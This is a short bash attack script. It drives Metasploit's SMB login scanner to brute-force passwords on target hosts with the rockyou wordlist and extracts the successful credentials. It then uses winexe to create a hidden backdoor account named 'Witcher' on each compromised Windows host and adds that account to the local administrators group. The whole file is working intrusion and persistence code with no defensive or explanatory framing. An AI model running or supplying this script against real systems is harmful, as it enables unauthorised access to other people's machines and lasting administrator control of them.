#!/bin/bash

smb_user="Administrator"
while getopts u:a: option
do
case "${option}"
in
	u) smb_user=${OPTARG};;
	a) rhosts=${OPTARG};;
esac
done
results=$(msfconsole -q -x "use auxiliary/scanner/smb/smb_login;\
		set RHOSTS "$rhosts";\
		set PASS_FILE /usr/share/wordlists/rockyou.txt;\
		set SMBUser "$smb_user";\
		set ABORT_ON_LOCKOUT true;\
		set STOP_ON_SUCCESS true;\
		set BLANK_PASSWORDS true;\
		set USER_AS_PASS true;\
		set DETECT_ANY_AUTH true;\
		set VERBOSE true;\
		set DBGTRACE true;\
		run;exit;" | grep -oP "\d*\.\d*\.\d*\.\d*.*Success:.*:\w*.*" | grep -Po "(?<=:)[^']+(?=')" | grep -Po "(?<=- )[^']+(?=:\d* -)|^\w*$" | sed '$!N;s/\n/ /'| sed -r 's/[ ]+/ password:/g' | sed -e 's/^/Ip:/' ) 
while IFS= read -r line; do
    temp_ip=$(echo $line | grep -Po "(?<=Ip:).*(?= )")
    temp_password=$(echo $line | grep -Po "(?<= password:).*")
    winexe -U "$temp_ip"/"$smb_user"%"$temp_password" //"$temp_ip" "Net user /add Witcher Switcher"
    winexe -U "$temp_ip"/"$smb_user"%"$temp_password" //"$temp_ip" "net localgroup administrators Witcher /add"
done <<< "$results"
exit
